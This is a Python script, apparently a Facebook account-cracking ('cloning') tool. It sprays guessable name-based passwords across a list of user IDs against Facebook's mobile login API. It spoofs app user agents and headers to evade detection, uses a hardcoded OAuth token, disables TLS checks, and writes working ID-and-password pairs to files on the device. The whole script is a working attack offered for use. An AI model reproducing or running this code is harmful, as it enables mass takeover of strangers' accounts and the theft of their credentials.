import os, sys, re, time, json, random, uuid, platform, requests, arrow
from concurrent.futures import ThreadPoolExecutor as tred
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global Settings
loop = 0
oks = []
cps = []

# --- CHARSI PREMIUM USER-AGENTS (FIXED) ---
def get_ua_charsi():
    android_v = random.choice(['12', '13', '14', '15'])
    fb_v = f"{random.randint(440, 455)}.0.0.{random.randint(10, 99)}"
    build = str(random.randint(500000000, 600000000))
    
    # Real 2024/25 Models
    devices = [
        ('Samsung', 'SM-S928B', 'S24 Ultra'),
        ('Apple', 'iPhone16,1', 'iPhone 15 Pro Max'),
        ('Xiaomi', '23127PN0CG', 'Xiaomi 14'),
        ('Infinix', 'X6833B', 'Note 30'),
        ('Tecno', 'KJ5', 'Spark 20'),
        ('OnePlus', 'CPH2581', 'OnePlus 12')
    ]
    brand, model_code, name = random.choice(devices)
    
    ua = f"Mozilla/5.0 (Linux; Android {android_v}; {model_code} Build/UKQ1.{random.randint(230000, 240000)}.001; wv) " \
         f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(115, 126)}.0.0.0 " \
         f"Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_v};FBBV/{build};FBDV/{model_code};FBMD/{brand};" \
         f"FBSN/Android;FBSV/{android_v};FBPN/com.facebook.katana;FBLC/en_US;FBBK/1;FBOP/1;FBCR/Zong;]"
    return ua

# --- MAIN LOGIN METHOD (FIXED) ---
def method_charsi(ids, pas):
    global loop, oks, cps
    sys.stdout.write(f'\r\r \033[1;37m[CHARSI-M1] {loop}|OK:-{len(oks)} ')
    sys.stdout.flush()
    
    try:
        for password in pas:
            ua = get_ua_charsi()
            session = requests.Session()
            
            # Advanced Headers for bypassing
            headers = {
                'Authority': 'graph.facebook.com',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'X-FB-Connection-Type': 'WIFI',
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            }
            
            payload = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': ids,
                'password': password,
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'generate_session_cookies': '1',
                'method': 'auth.login'
            }
            
            # Request sending
            response = session.post("https://b-graph.facebook.com/auth/login", data=payload, headers=headers, verify=False).json()
            
            if 'session_key' in response:
                print(f'\r\r \033[1;32m[CHARSI-OK] {ids} | {password} \033[1;97m')
                oks.append(ids)
                with open('/sdcard/CHARSI-OK.txt', 'a') as f:
                    f.write(f'{ids}|{password}\n')
                break
            elif 'www.facebook.com' in response.get('error', {}).get('message', ''):
                print(f'\r\r \033[1;33m[CHARSI-CP] {ids} | {password} \033[1;97m')
                cps.append(ids)
                with open('/sdcard/CHARSI-CP.txt', 'a') as f:
                    f.write(f'{ids}|{password}\n')
                break
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(10) # Internet slow ho to wait karega
    except:
        pass

# --- BANNER ---
def banner():
    os.system('clear')
    print("""
 \033[1;32m  ██████╗██╗  ██╗ █████╗ ██████╗ ███████╗██╗
 \033[1;32m ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔════╝██║
 \033[1;32m ██║     ███████║███████║██████╔╝███████╗██║
 \033[1;32m ██║     ██╔══██║██╔══██║██╔══██╗╚════██║██║
 \033[1;32m ╚██████╗██║  ██║██║  ██║██║  ██║███████║██║
 \033[1;32m  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝
 \033[1;37m--------------------------------------------
 \033[1;37m AUTHOR : CHARSI MASTER
 \033[1;37m STATUS : FIXED & WORKING (2024-25)
 \033[1;37m--------------------------------------------""")

# --- MAIN SYSTEM ---
def main():
    banner()
    print(" [1] File Cloning (Charsi Speed)")
    print(" [0] Exit")
    opt = input("\n CHOOSE OPTION: ")
    if opt == '1':
        file_cloning()
    else:
        exit()

def file_cloning():
    banner()
    file = input(" ENTER FILE PATH: ")
    try:
        ids = open(file, 'r').read().splitlines()
    except:
        print(" FILE NOT FOUND!"); time.sleep(2); main()
    
    banner()
    print(" [1] Full Best Passwords")
    input("\n SELECT: ")
    
    with tred(max_workers=30) as pool:
        banner()
        print(f" TOTAL IDS: {len(ids)}")
        print(" CHARSI POWER WORKING...\n")
        for user in ids:
            try:
                if '|' in user:
                    uid, name = user.split('|')[:2]
                else:
                    uid, name = user, "fb user"
                
                first = name.split(' ')[0].lower()
                pas = [name.lower(), first+'123', first+'1234', first+'786']
                pool.submit(method_charsi, uid, pas)
            except:pass

if __name__ == "__main__":
    main()
